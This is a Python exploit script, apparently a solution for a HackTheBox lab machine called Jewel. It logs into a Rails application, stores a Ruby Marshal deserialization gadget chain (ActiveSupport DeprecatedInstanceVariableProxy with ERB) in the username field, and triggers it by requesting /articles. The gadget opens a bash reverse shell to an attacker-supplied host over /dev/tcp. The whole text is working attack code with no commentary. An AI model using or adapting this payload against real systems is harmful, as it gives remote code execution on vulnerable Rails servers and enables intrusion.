import requests
import re
import sys

URL='http://{}:8080'.format(sys.argv[1])
username='zeruel'
password='aaaaaaaa'
email='zeru@jewel.htb'

if len(sys.argv) != 4:
    print("specify target IP, your IP and port: python3 rev.py 10.10.10.211 10.10.XX.XX 9001")
    exit(0)

s = requests.Session()

resp = s.get(URL + '/signup')
rx = r'token" content="(.*)"'

token = re.search(rx,resp.text).group(1)

data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['session[email]'] = email
data['session[password]'] = password
data['commit'] = 'Log in'
resp = s.post(URL + '/login', data=data)

rx = r'href="/users/(.*)"'
user_id = re.search(rx,resp.text).group(1)

rev = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(sys.argv[2], sys.argv[3])
payload = '\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy'
payload += '\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22'
payload += '{}\x60{}\x60'.format(chr(len(rev)+7), rev)
payload += '\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A'
payload += '\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1F'
payload += 'ActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T'

data = {}
data['utf8'] = 'â'
data['authenticity_token'] = token
data['_method'] = 'patch'
data['user[username]'] = payload
data['commit'] = 'Update User'
s.post(URL + '/users/' + user_id, data=data)
s.post(URL + '/users/' + user_id, data=data)

s.get(URL + '/articles')
